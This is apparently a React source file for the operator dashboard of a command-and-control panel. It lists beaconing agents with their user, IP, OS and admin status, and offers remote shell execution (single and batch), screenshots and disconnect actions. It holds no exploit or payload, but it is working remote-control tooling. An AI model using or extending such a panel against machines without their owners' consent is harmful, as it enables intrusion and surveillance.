import { useClients, useRealtimeClients } from "@/hooks/useClients";
import { useNavigate } from "react-router-dom";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Checkbox } from "@/components/ui/checkbox";
import { Skeleton } from "@/components/ui/skeleton";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Textarea } from "@/components/ui/textarea";
import {
  Monitor,
  Wifi,
  WifiOff,
  Clock,
  Shield,
  Search,
  Eye,
  Camera,
  Terminal,
  Send,
  RefreshCw,
  Power,
  ChevronDown,
  MonitorOff,
} from "lucide-react";
import { formatDistanceToNow } from "date-fns";
import { useState, useMemo, useCallback } from "react";
import { dispatchCommand, dispatchBatchCommand, waitForResult } from "@/lib/commands";
import { toast } from "sonner";

type SortKey = "status" | "machine_name" | "username" | "os" | "ip" | "is_admin" | "last_seen";
type SortDir = "asc" | "desc";

function isOnline(lastSeen: string | null) {
  if (!lastSeen) return false;
  // Agent beacons every ~5s. 300s (5 min) allows for long-running commands
  // that temporarily block the beacon loop (e.g. screenshots, file ops).
  return Date.now() - new Date(lastSeen).getTime() < 300 * 1000;
}

function isIdle(lastSeen: string | null) {
  if (!lastSeen) return false;
  const diff = Date.now() - new Date(lastSeen).getTime();
  return diff >= 300 * 1000 && diff < 10 * 60 * 1000;
}

function statusRank(lastSeen: string | null): number {
  if (isOnline(lastSeen)) return 0;
  if (isIdle(lastSeen)) return 1;
  return 2;
}

function getOsIcon(os: string | null): string {
  if (!os) return "";
  const lower = os.toLowerCase();
  if (lower.includes("windows")) return "W";
  if (lower.includes("linux")) return "L";
  if (lower.includes("mac") || lower.includes("darwin")) return "M";
  if (lower.includes("android")) return "A";
  return "";
}

const Dashboard = () => {
  const { data: clients, isLoading } = useClients();
  useRealtimeClients();
  const navigate = useNavigate();
  const [search, setSearch] = useState("");
  const [sortKey, setSortKey] = useState<SortKey>("last_seen");
  const [sortDir, setSortDir] = useState<SortDir>("desc");
  const [selected, setSelected] = useState<Set<string>>(new Set());
  const [batchCmdOpen, setBatchCmdOpen] = useState(false);
  const [batchCmd, setBatchCmd] = useState("");
  const [batchSending, setBatchSending] = useState(false);
  const [shellModal, setShellModal] = useState<{ machineId: string; name: string } | null>(null);
  const [shellCmd, setShellCmd] = useState("");
  const [shellResult, setShellResult] = useState<string | null>(null);
  const [shellRunning, setShellRunning] = useState(false);

  const stats = useMemo(() => {
    if (!clients) return { online: 0, offline: 0, total: 0, admins: 0, idle: 0 };
    const online = clients.filter((c) => isOnline(c.last_seen)).length;
    const idle = clients.filter((c) => isIdle(c.last_seen)).length;
    return {
      online,
      idle,
      offline: clients.length - online - idle,
      total: clients.length,
      admins: clients.filter((c) => c.is_admin).length,
    };
  }, [clients]);

  const handleSort = useCallback((key: SortKey) => {
    setSortKey((prev) => {
      if (prev === key) {
        setSortDir((d) => (d === "asc" ? "desc" : "asc"));
        return key;
      }
      setSortDir("asc");
      return key;
    });
  }, []);

  const filtered = useMemo(() => {
    if (!clients) return [];
    let list = clients;
    if (search) {
      const q = search.toLowerCase();
      list = list.filter(
        (c) =>
          c.machine_name?.toLowerCase().includes(q) ||
          c.username?.toLowerCase().includes(q) ||
          c.ip?.toLowerCase().includes(q) ||
          c.os?.toLowerCase().includes(q) ||
          c.machine_id.toLowerCase().includes(q)
      );
    }

    return [...list].sort((a, b) => {
      let cmp = 0;
      switch (sortKey) {
        case "status":
          cmp = statusRank(a.last_seen) - statusRank(b.last_seen);
          break;
        case "machine_name":
          cmp = (a.machine_name || "").localeCompare(b.machine_name || "");
          break;
        case "username":
          cmp = (a.username || "").localeCompare(b.username || "");
          break;
        case "os":
          cmp = (a.os || "").localeCompare(b.os || "");
          break;
        case "ip":
          cmp = (a.ip || "").localeCompare(b.ip || "");
          break;
        case "is_admin":
          cmp = Number(b.is_admin) - Number(a.is_admin);
          break;
        case "last_seen":
          cmp = new Date(a.last_seen || 0).getTime() - new Date(b.last_seen || 0).getTime();
          break;
      }
      return sortDir === "desc" ? -cmp : cmp;
    });
  }, [clients, search, sortKey, sortDir]);

  const toggleSelect = useCallback((machineId: string) => {
    setSelected((prev) => {
      const next = new Set(prev);
      if (next.has(machineId)) next.delete(machineId);
      else next.add(machineId);
      return next;
    });
  }, []);

  const toggleSelectAll = useCallback(() => {
    if (!filtered.length) return;
    setSelected((prev) => {
      if (prev.size === filtered.length) return new Set();
      return new Set(filtered.map((c) => c.machine_id));
    });
  }, [filtered]);

  const handleBatchCmd = useCallback(async () => {
    if (!batchCmd.trim()) return;
    setBatchSending(true);
    const ids = [...selected];
    const results = await dispatchBatchCommand(ids, "shell", { cmd: batchCmd.trim() });
    toast.success(`Command sent to ${results.length} machines`);
    setBatchCmd("");
    setBatchSending(false);
    setBatchCmdOpen(false);
  }, [batchCmd, selected]);

  const handleBatchAction = useCallback(async (command: string, label: string) => {
    const ids = [...selected];
    const results = await dispatchBatchCommand(ids, command);
    toast.success(`"${label}" sent to ${results.length} machines`);
  }, [selected]);

  const handleQuickShell = useCallback(async () => {
    if (!shellModal || !shellCmd.trim()) return;
    setShellRunning(true);
    setShellResult(null);
    const cmdId = await dispatchCommand(shellModal.machineId, "shell", { cmd: shellCmd.trim() });
    if (!cmdId) {
      setShellResult("Failed to dispatch command");
      setShellRunning(false);
      return;
    }
    const result = await waitForResult(cmdId);
    setShellResult(result?.result || result?.status || "No response");
    setShellRunning(false);
  }, [shellModal, shellCmd]);

  const handleQuickScreenshot = useCallback(async (machineId: string, name: string) => {
    const cmdId = await dispatchCommand(machineId, "screenshot");
    if (cmdId) toast.success(`Screenshot request sent to ${name}`);
  }, []);

  const SortHeader = ({ label, field }: { label: string; field: SortKey }) => (
    <TableHead
      className="cursor-pointer select-none hover:text-foreground transition-colors"
      onClick={() => handleSort(field)}
    >
      <div className="flex items-center gap-1">
        {label}
        {sortKey === field && (
          <ChevronDown
            className={`w-3 h-3 transition-transform ${
              sortDir === "asc" ? "rotate-180" : ""
            }`}
          />
        )}
      </div>
    </TableHead>
  );

  return (
    <div className="space-y-5">
      {/* Stats */}
      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3">
        {[
          { label: "Online", value: stats.online, icon: Wifi, color: "text-emerald-400", bg: "bg-emerald-500/10" },
          { label: "Idle", value: stats.idle, icon: Clock, color: "text-amber-400", bg: "bg-amber-500/10" },
          { label: "Offline", value: stats.offline, icon: WifiOff, color: "text-gray-400", bg: "bg-gray-500/10" },
          { label: "Total Agents", value: stats.total, icon: Monitor, color: "text-primary", bg: "bg-primary/10" },
          { label: "Admins", value: stats.admins, icon: Shield, color: "text-red-400", bg: "bg-red-500/10" },
        ].map(({ label, value, icon: Icon, color, bg }) => (
          <Card key={label} className="border-border/30">
            <CardContent className="p-3.5 flex items-center gap-3">
              <div className={`w-9 h-9 rounded-lg ${bg} flex items-center justify-center`}>
                <Icon className={`w-4 h-4 ${color}`} />
              </div>
              <div>
                <p className="text-xl font-bold">{isLoading ? "-" : value}</p>
                <p className="text-[11px] text-muted-foreground">{label}</p>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>

      {/* Batch Action Bar */}
      {selected.size > 0 && (
        <div className="flex items-center gap-2 px-4 py-2.5 bg-primary/5 border border-primary/20 rounded-lg">
          <span className="text-sm font-medium text-primary">
            {selected.size} selected
          </span>
          <div className="flex-1" />
          <Button size="sm" variant="outline" className="gap-1.5 h-7 text-xs" onClick={() => setBatchCmdOpen(true)}>
            <Terminal className="w-3 h-3" /> Execute Command
          </Button>
          <Button size="sm" variant="outline" className="gap-1.5 h-7 text-xs" onClick={() => handleBatchAction("sysinfo", "System Info")}>
            <RefreshCw className="w-3 h-3" /> Refresh Info
          </Button>
          <Button size="sm" variant="outline" className="gap-1.5 h-7 text-xs text-destructive border-destructive/30" onClick={() => handleBatchAction("exit", "Disconnect")}>
            <Power className="w-3 h-3" /> Disconnect
          </Button>
          <Button size="sm" variant="ghost" className="h-7 text-xs text-muted-foreground" onClick={() => setSelected(new Set())}>
            Clear
          </Button>
        </div>
      )}

      {/* Client Table */}
      <Card className="border-border/30">
        <CardContent className="p-0">
          <div className="flex items-center gap-2 p-3 border-b border-border/20">
            <Search className="w-4 h-4 text-muted-foreground/40" />
            <Input
              placeholder="Search by name, user, IP, OS, or machine ID..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="max-w-md h-8 text-sm bg-transparent border-none focus-visible:ring-0 placeholder:text-muted-foreground/30"
            />
            <div className="flex-1" />
            <span className="text-xs text-muted-foreground/40">
              {filtered.length} machines
            </span>
          </div>

          {isLoading ? (
            <div className="p-4 space-y-3">
              {Array.from({ length: 6 }).map((_, i) => (
                <div key={i} className="flex items-center gap-4">
                  <Skeleton className="w-4 h-4 rounded" />
                  <Skeleton className="w-3 h-3 rounded-full" />
                  <Skeleton className="w-28 h-4" />
                  <Skeleton className="w-20 h-4" />
                  <Skeleton className="w-16 h-5 rounded-full" />
                  <Skeleton className="w-24 h-4" />
                  <Skeleton className="w-12 h-5 rounded-full" />
                  <Skeleton className="w-20 h-4" />
                </div>
              ))}
            </div>
          ) : filtered.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-16 text-muted-foreground">
              <MonitorOff className="w-12 h-12 mb-3 opacity-20" />
              <p className="font-medium">No agents connected</p>
              <p className="text-sm text-muted-foreground/60 mt-1">
                Check your C2 URL configuration
              </p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow className="hover:bg-transparent border-border/20">
                    <TableHead className="w-10">
                      <Checkbox
                        checked={selected.size === filtered.length && filtered.length > 0}
                        onCheckedChange={toggleSelectAll}
                      />
                    </TableHead>
                    <SortHeader label="Status" field="status" />
                    <SortHeader label="Machine" field="machine_name" />
                    <SortHeader label="User" field="username" />
                    <SortHeader label="OS" field="os" />
                    <SortHeader label="IP Address" field="ip" />
                    <SortHeader label="Admin" field="is_admin" />
                    <SortHeader label="Last Seen" field="last_seen" />
                    <TableHead className="text-right">Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filtered.map((client) => {
                    const online = isOnline(client.last_seen);
                    const idle = isIdle(client.last_seen);
                    const isSelected = selected.has(client.machine_id);
                    return (
                      <TableRow
                        key={client.id}
                        className={`cursor-pointer transition-colors border-border/10 ${
                          isSelected ? "bg-primary/5" : "hover:bg-muted/30"
                        }`}
                        onClick={() => navigate(`/client/${client.machine_id}`)}
                      >
                        <TableCell onClick={(e) => e.stopPropagation()}>
                          <Checkbox
                            checked={isSelected}
                            onCheckedChange={() => toggleSelect(client.machine_id)}
                          />
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <span
                              className={`w-2.5 h-2.5 rounded-full flex-shrink-0 ${
                                online
                                  ? "bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.6)]"
                                  : idle
                                  ? "bg-amber-500 animate-pulse"
                                  : "bg-gray-600"
                              }`}
                            />
                            <span className={`text-xs ${
                              online ? "text-emerald-400" : idle ? "text-amber-400" : "text-muted-foreground"
                            }`}>
                              {online ? "Online" : idle ? "Idle" : "Offline"}
                            </span>
                          </div>
                        </TableCell>
                        <TableCell className="font-medium text-sm">
                          {client.machine_name || "\u2014"}
                        </TableCell>
                        <TableCell className="text-sm text-muted-foreground">
                          {client.username || "\u2014"}
                        </TableCell>
                        <TableCell>
                          <Badge
                            variant="secondary"
                            className="text-[11px] bg-muted/40 text-muted-foreground font-normal gap-1"
                          >
                            {getOsIcon(client.os) && (
                              <span className="font-bold text-primary">
                                {getOsIcon(client.os)}
                              </span>
                            )}
                            {client.os
                              ? client.os.length > 25
                                ? client.os.slice(0, 25) + "..."
                                : client.os
                              : "Unknown"}
                          </Badge>
                        </TableCell>
                        <TableCell className="font-mono text-xs text-muted-foreground">
                          {client.ip || "\u2014"}
                        </TableCell>
                        <TableCell>
                          {client.is_admin ? (
                            <Badge className="text-[10px] bg-red-500/15 text-red-400 border-red-500/20 hover:bg-red-500/20">
                              ADMIN
                            </Badge>
                          ) : (
                            <Badge variant="secondary" className="text-[10px] bg-blue-500/10 text-blue-400/70 border-0">
                              USER
                            </Badge>
                          )}
                        </TableCell>
                        <TableCell className="text-xs text-muted-foreground">
                          <div className="flex items-center gap-1">
                            <Clock className="w-3 h-3 opacity-40" />
                            {client.last_seen
                              ? formatDistanceToNow(new Date(client.last_seen), { addSuffix: true })
                              : "Never"}
                          </div>
                        </TableCell>
                        <TableCell onClick={(e) => e.stopPropagation()}>
                          <div className="flex items-center justify-end gap-0.5">
                            <Button
                              size="icon"
                              variant="ghost"
                              className="h-7 w-7 text-muted-foreground hover:text-primary"
                              onClick={() => navigate(`/client/${client.machine_id}`)}
                              title="View"
                            >
                              <Eye className="w-3.5 h-3.5" />
                            </Button>
                            <Button
                              size="icon"
                              variant="ghost"
                              className="h-7 w-7 text-muted-foreground hover:text-primary"
                              onClick={() => handleQuickScreenshot(client.machine_id, client.machine_name || "Machine")}
                              title="Screenshot"
                            >
                              <Camera className="w-3.5 h-3.5" />
                            </Button>
                            <Button
                              size="icon"
                              variant="ghost"
                              className="h-7 w-7 text-muted-foreground hover:text-primary"
                              onClick={() => {
                                setShellModal({ machineId: client.machine_id, name: client.machine_name || "Machine" });
                                setShellCmd("");
                                setShellResult(null);
                              }}
                              title="Quick Shell"
                            >
                              <Terminal className="w-3.5 h-3.5" />
                            </Button>
                          </div>
                        </TableCell>
                      </TableRow>
                    );
                  })}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Batch Command Dialog */}
      <Dialog open={batchCmdOpen} onOpenChange={setBatchCmdOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Batch Execute Command</DialogTitle>
          </DialogHeader>
          <div className="space-y-3">
            <p className="text-sm text-muted-foreground">
              Send to <span className="text-primary font-medium">{selected.size}</span> selected machines.
            </p>
            <Textarea
              placeholder="Enter shell command..."
              value={batchCmd}
              onChange={(e) => setBatchCmd(e.target.value)}
              className="font-mono text-sm min-h-[80px]"
            />
            <Button onClick={handleBatchCmd} disabled={batchSending || !batchCmd.trim()} className="w-full">
              {batchSending ? "Sending..." : "Execute"}
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Quick Shell Modal */}
      <Dialog open={!!shellModal} onOpenChange={(open) => !open && setShellModal(null)}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Terminal className="w-4 h-4" />
              Quick Shell — {shellModal?.name}
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-3">
            <div className="flex gap-2">
              <Input
                placeholder="Enter command..."
                value={shellCmd}
                onChange={(e) => setShellCmd(e.target.value)}
                className="font-mono text-sm"
                onKeyDown={(e) => e.key === "Enter" && handleQuickShell()}
                disabled={shellRunning}
              />
              <Button onClick={handleQuickShell} disabled={shellRunning || !shellCmd.trim()} size="sm">
                <Send className="w-4 h-4" />
              </Button>
            </div>
            {(shellRunning || shellResult !== null) && (
              <div className="bg-[hsl(222,47%,4%)] rounded-lg p-3 font-mono text-xs max-h-64 overflow-auto">
                {shellRunning ? (
                  <span className="text-muted-foreground animate-pulse">
                    Waiting for response...
                  </span>
                ) : (
                  <pre className="text-terminal-text whitespace-pre-wrap">
                    {shellResult}
                  </pre>
                )}
              </div>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Dashboard;

